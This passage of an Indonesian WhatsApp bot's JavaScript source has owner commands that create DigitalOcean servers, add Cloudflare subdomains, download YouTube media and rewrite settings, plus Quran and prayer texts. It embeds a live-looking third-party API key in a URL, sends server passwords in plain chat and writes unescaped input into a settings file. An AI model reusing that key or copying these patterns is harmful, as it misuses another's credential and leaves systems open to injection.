      image: 'ubuntu-24-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps8g2c3": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'syd1',
      size: 's-2vcpu-8gb',
      image: 'ubuntu-24-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps8g4c3": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-24-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps16g4c3": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'syd1',
      size: 's-4vcpu-16gb-amd',
      image: 'ubuntu-24-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("skyzoo|ipserver"))
if (!text.split("|")) return m.reply(example("skyzoo|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp4(text)
if (anu.video) {
let urlMp3 = anu.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

case 'upapikey': {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");

    if (!q) return m.reply("⚠️ Masukkan API Key baru!\n\nContoh: *.upapikey plta_183jwqkspAu2*");

    // Path file setting.js
    const filePath = ('./setting.js');

    try {
        // Baca isi file setting.js
        let settings = fs.readFileSync(filePath, 'utf8');

        // Cari dan ganti global.apikey dengan yang baru
        let newSettings = settings.replace(/global\.apikey\s*=\s*['"].*?['"];/, `global.apikey = '${q}';`);

        // Tulis ulang file setting.js dengan API Key yang baru
        fs.writeFileSync(filePath, newSettings, 'utf8');

        m.reply(`✅ *API Key berhasil diperbarui!*\n\n🔑 *API Key Baru:* ${q}\n⚠️ Restart bot untuk menerapkan perubahan.`);
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memperbarui API Key!");
    }
};
break;

case 'upcapikey': {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");

    if (!q) return m.reply("⚠️ Masukkan CAP API Key baru!\n\nContoh: *.upcapikey pltc_28nndkwo*");

    // Path file setting.js
    const filePath = ('./setting.js');

    try {
        // Baca isi file setting.js
        let settings = fs.readFileSync(filePath, 'utf8');

        // Cari dan ganti global.capikey dengan yang baru
        let newSettings = settings.replace(/global\.capikey\s*=\s*['"].*?['"];/, `global.capikey = '${q}';`);

        // Tulis ulang file setting.js dengan API Key yang baru
        fs.writeFileSync(filePath, newSettings, 'utf8');

        m.reply(`✅ *CAP API Key berhasil diperbarui!*\n\n🔑 *CAP API Key Baru:* ${q}\n⚠️ Restart bot untuk menerapkan perubahan.`);
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memperbarui CAP API Key!");
    }
};
break;

case 'updomain': {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");

    if (!q) return m.reply("⚠️ Masukkan domain baru!\n\nContoh: *.updomain https://woosak/*");

    // Path file setting.js
    const filePath = ('./setting.js');

    try {
        // Baca isi file setting.js
        let settings = fs.readFileSync(filePath, 'utf8');

        // Cari dan ganti global.domain dengan yang baru
        let newSettings = settings.replace(/global\.domain\s*=\s*['"].*?['"];/, `global.domain = '${q}';`);

        // Tulis ulang file setting.js dengan domain yang baru
        fs.writeFileSync(filePath, newSettings, 'utf8');

        m.reply(`✅ *Domain berhasil diperbarui!*\n\n🌐 *Domain Baru:* ${q}\n⚠️ Restart bot untuk menerapkan perubahan.`);
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memperbarui domain!");
    }
};
break;

case 'updomain-v2': {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");
    if (!q) return m.reply("⚠️ Masukkan Domain V2 baru!\n\nContoh: *.updomain-v2 https://woosak-v2/*");

    const filePath = ('./setting.js');

    try {
        let settings = fs.readFileSync(filePath, 'utf8');
        let newSettings = settings.replace(/global\.domainV2\s*=\s*['"].*?['"];/, `global.domainV2 = '${q}';`);
        fs.writeFileSync(filePath, newSettings, 'utf8');

        m.reply(`✅ *Domain V2 berhasil diperbarui!*\n\n🌐 *Domain V2 Baru:* ${q}\n⚠️ Restart bot untuk menerapkan perubahan.`);
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memperbarui Domain V2!");
    }
};
break;

case 'upapikey-v2': {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");
    if (!q) return m.reply("⚠️ Masukkan API Key V2 baru!\n\nContoh: *.upapikey-v2 plta_183jwqkspAu2*");

    const filePath = ('./setting.js');

    try {
        let settings = fs.readFileSync(filePath, 'utf8');
        let newSettings = settings.replace(/global\.apikeyV2\s*=\s*['"].*?['"];/, `global.apikeyV2 = '${q}';`);
        fs.writeFileSync(filePath, newSettings, 'utf8');

        m.reply(`✅ *API Key V2 berhasil diperbarui!*\n\n🔑 *API Key V2 Baru:* ${q}\n⚠️ Restart bot untuk menerapkan perubahan.`);
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memperbarui API Key V2!");
    }
};
break;

case 'upcapikey-v2': {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");
    if (!q) return m.reply("⚠️ Masukkan CAP API Key V2 baru!\n\nContoh: *.upcapikey-v2 pltc_28nndkwo*");

    const filePath = ('./setting.js');

    try {
        let settings = fs.readFileSync(filePath, 'utf8');
        let newSettings = settings.replace(/global\.capikeyV2\s*=\s*['"].*?['"];/, `global.capikeyV2 = '${q}';`);
        fs.writeFileSync(filePath, newSettings, 'utf8');

        m.reply(`✅ *CAP API Key V2 berhasil diperbarui!*\n\n🔑 *CAP API Key V2 Baru:* ${q}\n⚠️ Restart bot untuk menerapkan perubahan.`);
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memperbarui CAP API Key V2!");
    }
};
break;

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

case "lumina-ai": {
    if (!text) return m.reply(`*Example Command :*\n*.lumina-ai* haii`);

    conn.sendMessage(m.chat, { react: { text: `⌛`, key: m.key }})
    try {
        let url = `https://www.archive-ui.biz.id/ai/luminai?text=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();

        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}`);
        }


        let aiResponse = json.result;
        if (!aiResponse) {
            return m.reply("❌ Tidak ada respons AI yang ditemukan.");
        }


        m.reply(aiResponse);

    } catch (err) {
        console.error("Error ailuminai:", err);
        m.reply("❌ Terjadi kesalahan saat memproses permintaan AI.");
    }
}
break

case "audiosurah": case "audiosurat": {
	let wrong = `*Example Command :*\n*.audiosurah* 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return m.reply(`${wrong}`)
      m.reply(mess.wait)
   conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=efcb180d3fd3134748648887` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break

case "ayatkursi": {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  m.reply(caption)
}
break

case "bacaansholat": case "bacaanshalat": {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
